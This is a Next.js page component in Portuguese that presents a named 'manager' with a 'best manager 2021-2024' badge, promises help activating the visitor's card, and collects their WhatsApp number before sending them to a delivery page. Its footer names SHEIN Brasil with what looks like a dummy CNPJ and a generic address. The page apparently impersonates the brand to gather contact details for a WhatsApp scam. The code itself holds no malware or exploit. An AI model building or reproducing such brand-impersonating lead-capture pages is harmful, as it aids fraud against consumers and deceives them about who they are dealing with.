"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Trophy } from "lucide-react"

// Função para formatar WhatsApp
const formatWhatsApp = (value: string) => {
  const numbers = value.replace(/\D/g, "")

  if (numbers.length <= 2) {
    return numbers
  } else if (numbers.length <= 7) {
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`
  } else if (numbers.length <= 11) {
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`
  } else {
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`
  }
}

// Função para validar WhatsApp (11 dígitos)
const validateWhatsApp = (whatsapp: string) => {
  const numbers = whatsapp.replace(/\D/g, "")
  return numbers.length === 11
}

export default function ManagerPage() {
  const router = useRouter()
  const [whatsapp, setWhatsapp] = useState("")
  const [isValid, setIsValid] = useState(false)

  const handleWhatsAppChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    const formatted = formatWhatsApp(value)
    setWhatsapp(formatted)
    setIsValid(validateWhatsApp(formatted))
  }

  const handleContinue = () => {
    if (!isValid) return

    // Salva o WhatsApp no localStorage
    const cleanWhatsApp = whatsapp.replace(/\D/g, "")
    localStorage.setItem("userWhatsApp", cleanWhatsApp)

    console.log("WhatsApp salvo:", cleanWhatsApp)

    // Redireciona para a próxima página
    router.push("/delivery-method")
  }

  return (
    <div className="min-h-screen bg-[#f2f2f2] font-sans">
      <div className="px-5 py-5 max-w-2xl mx-auto">
        <div className="bg-white rounded-xl shadow-lg p-5">
          <h1 className="text-2xl font-bold text-gray-800 mb-3 text-center mt-0">Ótimo, quase lá!</h1>

          <p className="text-sm text-gray-600 mb-5 text-center leading-relaxed">
            Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
          </p>

          {/* Manager Card */}
          <div className="bg-[#fff7db] border border-[#ffbf00] rounded-xl p-5 pb-3 mb-5">
            <div className="flex justify-center mb-3">
              <Image
                src="/gerente-juliana.png"
                alt="Foto da Gerente"
                width={120}
                height={120}
                className="rounded-full object-cover"
                style={{ border: "3px solid #ffbf00" }}
              />
            </div>

            <p className="text-gray-600 text-sm text-center mb-1">Gerente</p>
            <p className="text-[#ffbf00] font-bold text-lg text-center -mt-1 mb-2">Juliana Benedito</p>

            <div className="flex justify-center mt-0">
              <div className="bg-[#ffbf00] text-white px-3 py-1 rounded-full text-xs font-bold flex items-center">
                <Trophy className="w-3 h-3 mr-1" />
                Melhor gerente 2021-2024
              </div>
            </div>
          </div>

          {/* WhatsApp Input */}
          <div className="flex items-center justify-center mb-2">
            <Image src="/whatsapp-icon.png" alt="WhatsApp" width={20} height={20} className="mr-3" />
            <input
              type="tel"
              className="flex h-10 w-full px-3 py-2 border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1 focus:outline-none"
              placeholder="Digite seu WhatsApp aqui"
              maxLength={15}
              value={whatsapp}
              onChange={handleWhatsAppChange}
              style={{
                boxShadow: "none",
                borderTop: "none",
                borderLeft: "none",
                borderRight: "none",
                borderRadius: "0",
              }}
            />
          </div>

          {/* Continue Button */}
          <button
            onClick={handleContinue}
            disabled={!isValid}
            className={`w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
              isValid ? "bg-black text-white hover:bg-black/90" : "bg-gray-300 text-gray-500 cursor-not-allowed"
            }`}
          >
            Continuar
          </button>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#f9f9f9] border-t border-[#eaeaea] px-4 py-6 text-center mt-12">
        <div className="max-w-2xl mx-auto">
          <p className="text-gray-600 text-xs mb-1 leading-tight">SHEIN Brasil LTDA | CNPJ: 12.345.678/0001-99</p>
          <p className="text-gray-600 text-xs mb-2 leading-tight">
            Av. Paulista, 1000 - Bela Vista, São Paulo - SP, 01310-100
          </p>
          <p className="text-gray-500 text-xs">© 2025 - Todos os direitos reservados</p>
        </div>
      </footer>
    </div>
  )
}
